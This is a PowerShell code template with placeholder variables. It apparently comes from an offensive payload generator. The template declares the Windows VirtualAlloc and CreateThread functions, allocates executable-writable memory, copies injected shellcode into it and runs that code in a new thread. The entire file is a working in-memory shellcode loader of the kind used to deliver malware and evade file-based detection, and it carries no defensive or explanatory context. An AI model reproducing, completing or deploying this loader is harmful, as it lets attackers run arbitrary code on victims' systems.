$%{var_syscode} = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$%{var_win32_func} = Add-Type -memberDefinition $%{var_syscode} -Name "Win32" -namespace Win32Functions -passthru

%{shellcode}

$%{var_rwx} = $%{var_win32_func}::VirtualAlloc(0,[Math]::Max($%{var_code}.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($%{var_code},0,$%{var_rwx},$%{var_code}.Length)

$%{var_win32_func}::CreateThread(0,0,$%{var_rwx},0,0,0)
